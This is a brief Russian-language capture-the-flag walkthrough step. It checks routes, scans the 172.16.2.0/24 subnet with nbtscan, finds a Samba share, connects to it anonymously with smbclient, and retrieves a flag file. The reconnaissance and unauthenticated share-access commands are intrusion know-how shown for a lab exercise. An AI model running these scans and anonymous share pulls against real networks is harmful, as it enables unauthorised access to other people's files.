Изучаем вывод ip route чтобы проверить доступ в другие сети/адреса
Изучаем активные хосты с помощью
```
nbtscan 172.16.2.0/24
```
Находим samba share на 172.16.2.101
Подключаем и забираем флаг
```
smbclient //SAMBASHARE01/sambashare -N
get flag.txt
cat flag.txt
```
